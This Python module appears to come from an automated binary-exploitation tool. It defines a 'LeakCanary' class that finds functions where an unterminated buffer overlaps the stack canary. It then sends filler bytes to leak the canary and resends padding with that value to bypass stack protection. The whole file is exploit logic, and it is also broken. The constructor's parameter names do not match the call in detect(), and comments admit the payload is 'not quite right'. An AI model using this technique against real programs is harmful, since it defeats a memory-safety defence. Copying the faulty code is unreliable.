from ..analyses import Vulnerability
from ..partials.unterminatedbuffer import UnterminatedBuffer
from ..functions import getLocal

def hasCanary(function):
    for call in function["calls"]:
        if call["name"] == "__stack_chk_fail":
            return True
    return False

def getCanaryBuffer(function):
    return getLocal("local_10", function)

def overlappingBuffers(buffer1, buffer2):
    if buffer1.location + buffer1.size > buffer2.location:
        return True
    return False

class LeakCanary(Vulnerability):
    name = "LeakCanary"
    
    def __init__(self, function, canary, exploitBuffer):
        self.function = function
        self.canary = canary
        self.exploitBuffer = exploitBuffer
        self.canaryValue = None
    
    def detect(self, function):
        if hasCanary(function):
            canary = getCanaryBuffer(function)
            if UnterminatedBuffer.has(function):
                buffer = UnterminatedBuffer.get(function)
                if overlappingBuffers(buffer.buffer, canary):
                    # Can we write to the buffer again and return
                    # Or do we just crash?
                    if buffer.patchable():
                        return LeakCanary(
                            function=function,
                            canaryBuffer=canary,
                            exploitBuffer=buffer)
    
    def exploit(self, conn):
        conn.navigate(self.function)
        conn.navigate(self.exploitBuffer.inputLocation)
        conn.send(b"A"*self.exploitBuffer.bufferSize) # not quite right
        self.canaryValue = conn.resolve(self.canary)
        # patch
        conn.navigate(self.exploitBuffer.inputLocation2) # might need to be inputLocation2?
        conn.send(b"A"*self.exploitBuffer.bufferSize + self.canaryValue)